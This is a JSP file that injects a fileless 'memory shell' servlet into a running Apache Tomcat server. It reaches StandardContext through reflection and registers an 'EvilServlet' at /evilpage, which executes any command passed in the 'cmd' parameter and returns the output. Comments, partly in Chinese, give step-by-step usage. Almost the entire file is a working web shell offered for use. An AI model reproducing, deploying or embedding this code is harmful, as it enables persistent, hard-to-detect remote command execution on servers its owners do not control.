<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>


<!-- 1 request this file -->
<!-- 2 request thisfile/../evilpage?cmd=calc/systeminfo -->

<%
    class EvilServlet implements Servlet {
        @Override
        //当Servlet第一次被创建对象时执行该方法,该方法在整个生命周期中只执行一次
        public void init(ServletConfig config) throws ServletException {
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        //当Servlet被销毁时执行该方法
        public void destroy() {
        }

        public ServletConfig getServletConfig() {
            return null;
        }


        @Override
        //对客户端响应的方法,该方法会被执行多次，每次请求该servlet都会执行该方法
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            HttpServletRequest servletRequest = (HttpServletRequest) req;
            HttpServletResponse servletResponse1 = (HttpServletResponse) res;
            String cmd = servletRequest.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                servletResponse1.getOutputStream().write(stringBuilder.toString().getBytes());
                servletResponse1.getOutputStream().flush();
                servletResponse1.getOutputStream().close();
                return;
            } else {
                servletResponse1.sendError(HttpServletResponse.SC_NOT_FOUND);
            }
        }
    }

%>


<%
    //从org.apache.catalina.core.ApplicationContext反射获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    EvilServlet evilServlet = new EvilServlet();

    //将恶意servlet封装成wrapper添加到StandardContext的children当中
    org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
    //设置Servlet名
    evilWrapper.setName("evilPage");
    evilWrapper.setLoadOnStartup(1);
    evilWrapper.setServlet(evilServlet);
    evilWrapper.setServletClass(evilServlet.getClass().getName());
    standardContext.addChild(evilWrapper);
    //设置ServletMap将访问的URL和wrapper进行绑定
    standardContext.addServletMapping("/evilpage", "evilPage");
    out.println("动态注入servlet成功");
%>
